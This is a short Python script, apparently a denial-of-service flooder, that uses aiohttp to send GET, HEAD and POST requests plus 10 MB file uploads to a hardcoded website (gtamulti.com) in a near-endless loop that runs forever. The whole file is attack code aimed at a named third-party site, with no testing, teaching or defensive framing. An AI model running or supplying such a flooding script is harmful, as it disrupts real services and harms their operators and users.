import aiohttp
import asyncio

async def send_requests(url):
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
        for i in range(200000000000):
            tasks = []
            tasks.append(session.get(url))
            tasks.append(session.head(url))
            tasks.append(session.post(url, data={"key": "value"}))

            with open("large_file.txt", "rb") as file:
                data = file.read(10485760)
            tasks.append(session.post(url, data=data))
            
            responses = await asyncio.gather(*tasks)
            for response in responses:
                print(response.status)

url = "https://gtamulti.com"
asyncio.ensure_future(send_requests(url))

loop = asyncio.get_event_loop()
loop.run_forever()
